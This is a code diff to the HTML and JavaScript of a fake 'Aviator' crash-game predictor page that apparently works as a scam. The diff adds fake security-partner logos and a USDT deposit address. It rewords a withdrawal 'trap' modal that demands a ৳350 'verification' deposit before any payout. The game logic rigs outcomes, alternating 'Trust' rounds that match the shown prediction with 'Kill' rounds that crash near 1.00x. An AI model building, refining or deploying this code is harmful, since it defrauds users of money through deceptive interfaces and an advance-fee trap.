@@ -3,33 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator AI - Smart Cycle Pro</title>
+    <title>Aviator AI - Global Partner</title>
     <style>
         :root { --primary: #ff0040; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; --green: #28a745; --binance: #f0b90b; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; text-align: center; }
+        
+        /* Nav & Tabs */
         .nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; }
-        .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; }
-        .tab-bar { display: flex; justify-content: center; background: #111; padding: 10px; gap: 10px; }
-        .tab-btn { background: #222; color: #888; border: none; padding: 10px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; font-size: 1rem; }
+        .tab-bar { display: flex; justify-content: center; background: #111; padding: 8px; gap: 10px; }
+        .tab-btn { background: #222; color: #888; border: none; padding: 10px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.8rem; }
         .tab-btn.active { background: var(--primary); color: white; }
-        .page { display: none; padding: 15px; }
+
+        /* Game UI */
+        .page { display: none; padding: 15px; animation: fadeIn 0.3s; }
         .page.active { display: block; }
-        .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 210px; margin: 0 auto 15px; padding: 12px; box-shadow: 0 0 20px var(--neon); }
-        #next-pred { font-size: 2.8rem; color: var(--neon); font-weight: 900; text-shadow: 0 0 10px var(--neon); }
-        #game-box { position: relative; width: 100%; max-width: 600px; height: 300px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
-        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4.5rem; font-weight: 900; z-index: 10; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 190px; margin: 0 auto 15px; padding: 10px; box-shadow: 0 0 15px var(--neon); }
+        #next-pred { font-size: 2.5rem; color: var(--neon); font-weight: 900; }
+        
+        #game-box { position: relative; width: 100%; max-width: 600px; height: 280px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
+        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4rem; font-weight: 900; z-index: 10; }
+        
+        /* Controls */
         .controls { background: #1b1c1d; width: 100%; max-width: 600px; margin: 15px auto; padding: 20px; border-radius: 20px; box-sizing: border-box; }
-        .btn-main { width: 100%; padding: 18px; font-size: 1.5rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; }
+        .btn-main { width: 100%; padding: 16px; font-size: 1.4rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; }
+
+        /* Footer Partners */
+        .partner-footer { margin-top: 30px; padding: 20px; border-top: 1px solid #222; opacity: 0.6; }
+        .partner-footer p { font-size: 0.7rem; color: #666; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .partner-icons { display: flex; justify-content: center; align-items: center; gap: 25px; filter: grayscale(100%); }
+        .partner-icons img { height: 22px; }
+
+        /* Deposit/Withdraw UI */
         .card-ui { background: #1b1c1d; padding: 20px; border-radius: 15px; text-align: left; max-width: 400px; margin: auto; border: 1px solid #333; }
         .binance-box { background: #000; border: 1px solid var(--binance); padding: 15px; border-radius: 10px; margin-top: 10px; }
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; padding: 20px; }
-        .m-content { background: #1b1c1d; padding: 30px; border-radius: 20px; width: 100%; max-width: 350px; border: 1px solid #444; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; padding: 20px; }
     </style>
 </head>
 <body>
 
     <div class="nav">
-        <div style="font-weight:900; color:var(--primary);">AVIATOR SERVER HACK</div>
+        <div style="font-weight:900; color:var(--primary);">AVIATOR SERVER V3</div>
         <div class="bal-box">৳ <span id="balance">0.00</span></div>
     </div>
 
@@ -41,42 +57,55 @@
 
     <div id="game" class="page active">
         <div class="predictor-card">
+            <div style="font-size:0.5rem; color:#888;">ENCRYPTED SIGNAL</div>
             <div id="next-pred">SCANNING</div>
-            <div style="font-size:0.6rem; color:#4caf50;">● BOT ACTIVE</div>
         </div>
         <div id="game-box">
             <div id="multiplier">1.00x</div>
             <canvas id="gameCanvas"></canvas>
         </div>
         <div class="controls">
-            <input type="number" id="betAmt" value="50" min="20" style="background:#000; color:white; border:1px solid #444; padding:12px; width:80px; border-radius:8px; margin-bottom:10px; text-align:center;">
+            <input type="number" id="betAmt" value="50" style="background:#000; color:white; border:1px solid #444; padding:10px; width:80px; border-radius:8px; margin-bottom:10px; text-align:center;">
             <button id="actionBtn" class="btn-main" style="background: var(--green);">PLACE BET</button>
         </div>
     </div>
 
     <div id="deposit" class="page">
         <div class="card-ui">
-            <h3 style="color:var(--binance); margin-top:0;">Binance USDT (BEP20)</h3>
+            <h3 style="color:var(--binance); margin-top:0;">Secure Deposit</h3>
             <div class="binance-box">
-                <small style="color:var(--binance)">USDT Address (BEP20):</small><br>
+                <small style="color:var(--binance)">USDT (BEP20) Address:</small><br>
                 <span id="addr" style="font-size:0.65rem; word-break:break-all;">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</span>
                 <button onclick="copyAddr()" style="float:right; background:var(--binance); border:none; padding:4px 8px; border-radius:4px; font-weight:bold; cursor:pointer; font-size:0.7rem;">COPY</button>
             </div>
-            <button onclick="alert('Verification Started')" class="btn-main" style="background:var(--binance); color:black; margin-top:15px; font-size:1.1rem;">SUBMIT PAYMENT</button>
+            <p style="font-size:0.7rem; color:#888; margin-top:10px;">Min Deposit: ৳300 / $3. Activation is instant after 2 network confirmations.</p>
+            <button onclick="alert('System verifying...')" class="btn-main" style="background:var(--binance); color:black; margin-top:10px; font-size:1.1rem;">CONFIRM DEPOSIT</button>
         </div>
     </div>
 
     <div id="withdraw" class="page">
         <div class="card-ui">
-            <h3>Withdraw Profit</h3>
-            <button onclick="showTrap()" class="btn-main" style="background:#333;">Request Withdrawal</button>
+            <h3>Withdraw Funds</h3>
+            <p style="font-size:0.8rem; color:#888;">Estimated time: 5-30 minutes.</p>
+            <input type="text" placeholder="Wallet Address / Phone" style="width:100%; padding:12px; background:#000; border:1px solid #444; color:white; border-radius:8px; margin-bottom:10px;">
+            <button onclick="showTrap()" class="btn-main" style="background:#333;">Submit Request</button>
+        </div>
+    </div>
+
+    <div class="partner-footer">
+        <p>Global Security Partners</p>
+        <div class="partner-icons">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e9/Binance_logo.svg" alt="Binance">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
         </div>
     </div>
 
     <div id="trapModal" class="modal">
-        <div class="m-content">
-            <h3 style="color:var(--primary); margin-top:0;">Security Error</h3>
-            <p style="font-size:0.85rem; color:#ccc;">To verify your wallet address for profit withdrawal, a security deposit of **৳350** is required.</p>
+        <div style="background:#1b1c1d; padding:30px; border-radius:20px; width:90%; max-width:320px; border:1px solid #444;">
+            <h3 style="color:var(--primary); margin-top:0;">Action Required</h3>
+            <p style="font-size:0.85rem; color:#ccc; line-height:1.5;">To prevent money laundering, your account requires a one-time verification. Please deposit **৳350** to unlock withdraw access.</p>
             <button onclick="showPage('deposit')" class="btn-main" style="background:var(--green); font-size:1rem;">VERIFY NOW</button>
         </div>
     </div>
@@ -102,13 +131,14 @@
 
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
-    canvas.width = 600; canvas.height = 300;
+    canvas.width = 600; canvas.height = 280;
 
     onValue(userRef, (s) => {
         balance = s.val().balance;
         document.getElementById('balance').innerText = balance.toFixed(2);
     });
 
+    // --- SMART CYCLE LOGIC (Gap between false rounds) ---
     function generateNewCycle() {
         cycleLength = Math.floor(Math.random() * 3) + 5; 
         roundCount = 0;
@@ -126,26 +156,28 @@
     function setupRound() {
         if (roundCount >= cycleLength) generateNewCycle();
         predSignal = (Math.random() * (10.00 - 1.50) + 1.50).toFixed(2);
+        
         if (falseRounds.includes(roundCount)) {
-            actualCrash = (1.00 + Math.random() * 0.12).toFixed(2);
+            actualCrash = (1.00 + Math.random() * 0.12).toFixed(2); // Kill round
         } else {
-            actualCrash = predSignal;
+            actualCrash = predSignal; // Trust round
         }
+
         document.getElementById('next-pred').innerText = predSignal + "x";
         document.getElementById('multiplier').innerText = "1.00x";
         document.getElementById('multiplier').style.color = "white";
         roundCount++;
-        ctx.clearRect(0,0,600,300);
+        ctx.clearRect(0,0,600,280);
     }
 
     generateNewCycle();
     setupRound();
 
     function drawLine(elapsed) {
-        ctx.clearRect(0,0,600,300);
+        ctx.clearRect(0,0,600,280);
         ctx.beginPath(); ctx.strokeStyle = "#ff0040"; ctx.lineWidth = 5;
-        ctx.moveTo(0, 300);
-        ctx.quadraticCurveTo(elapsed*60, 300, elapsed*120, 300-(elapsed*45));
+        ctx.moveTo(0, 280);
+        ctx.quadraticCurveTo(elapsed*60, 280, elapsed*120, 280-(elapsed*45));
         ctx.stroke();
     }
 
@@ -191,7 +223,7 @@
 
     window.copyAddr = () => {
         navigator.clipboard.writeText(document.getElementById('addr').innerText);
-        alert("Copied!");
+        alert("USDT Address Copied!");
     };
 
     window.showTrap = () => {
